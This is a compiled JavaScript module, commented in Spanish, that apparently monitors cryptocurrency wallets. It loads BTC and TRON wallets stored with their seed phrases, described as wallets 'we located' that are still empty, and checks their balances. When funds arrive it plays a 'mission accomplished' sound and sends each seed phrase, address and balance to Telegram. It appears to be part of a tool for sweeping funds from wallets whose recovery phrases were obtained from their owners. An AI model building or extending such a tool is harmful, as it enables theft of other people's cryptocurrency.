"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.consultarWalletsVacias = void 0;
const path_1 = __importDefault(require("path"));
const child_process_1 = require("child_process");
const consultarSaldoWallet_1 = require("../consultas/consultarSaldoWallet");
const leerSeguimientoWalletCash_1 = require("./leer/leerSeguimientoWalletCash");
const telegram_1 = require("./telegram/telegram");
const consultarSaldoWallet_TRON_1 = require("../consultas/consultarSaldoWallet_TRON");
//ruta del sonido
const rutaSonido = path_1.default.join(__dirname, "../data/sonido/mision-cumplida1.wav");
//funcion para sonsultar las wallets que ubicamos, pero vacias
// a ver si ingreso dinero
const consultarWalletsVacias = async () => {
    const wallets = (0, leerSeguimientoWalletCash_1.leerSeguimientoWalletCash)();
    for (const wallet of wallets) {
        if (wallet.wallet_de === "BTC") {
            await validarBTC(wallet);
        }
        else {
            await validarTRON(wallet);
        }
        ;
    }
    ;
};
exports.consultarWalletsVacias = consultarWalletsVacias;
//validar si es BTC
const validarBTC = async (wallet) => {
    try {
        const resultado = await (0, consultarSaldoWallet_1.consultarSaldoWallet)(wallet.direccion);
        console.log(`Dirección BTC: ${wallet.direccion}`);
        console.log(`Saldo confir: ${resultado.confirmed} > unconfir: ${resultado.unconfirmed} > recibe: ${resultado.received}`);
        console.log("----------------------------------------");
        if (resultado.confirmed > 0 || resultado.unconfirmed > 0) {
            //reproducir sonido
            (0, child_process_1.exec)(`powershell -c (New-Object Media.SoundPlayer '${rutaSonido}').PlaySync();`);
            //armar objeto
            const datosCompletos = {
                frase: wallet.frase,
                wallet_de: `BTC`,
                direccion: wallet.direccion,
                saldo: `Confir: ${resultado.confirmed}, unconfir: ${resultado.unconfirmed}`,
                fecha: new Date().toISOString()
            };
            //enviar mensaje por telegram
            (0, telegram_1.enviarMensajeTelegram)(datosCompletos);
        }
    }
    catch (error) {
        console.error(`Error al consultar ${wallet.direccion}:`, error);
    }
};
//validar si es TRON
const validarTRON = async (wallet) => {
    try {
        const resultado = await (0, consultarSaldoWallet_TRON_1.consultarSaldoWallet_TRON)(wallet.direccion);
        //validar que la respuesta no sea NULL
        if (resultado === null) {
            console.log(`Wallet sin nada que buscar . . .
                  ----------------------------------------------------------`);
            return; // Finaliza la ejecución de esta función
        }
        //guardar todas las monedas de DATA
        const walletsData = resultado.data;
        for (const walletData of walletsData) {
            console.log(`Dirección TRON: ${wallet.direccion}`);
            console.log(`moneda: ${walletData.tokenAbbr} > balance: ${walletData.balance}`);
            console.log("----------------------------------------");
            if (Number(walletData.balance) > 0 || resultado.transactions_in > 0) {
                //reproducir sonido
                (0, child_process_1.exec)(`powershell -c (New-Object Media.SoundPlayer '${rutaSonido}').PlaySync();`);
                //armar objeto
                const datosCompletos = {
                    frase: wallet.frase,
                    wallet_de: `TRON = ${walletData.tokenAbbr}`,
                    direccion: wallet.direccion,
                    saldo: String(walletData.balance),
                    fecha: new Date().toISOString()
                };
                //enviar mensaje por telegram
                (0, telegram_1.enviarMensajeTelegram)(datosCompletos);
            }
        }
    }
    catch (error) {
        console.error(`Error al consultar ${wallet.direccion}:`, error);
    }
};
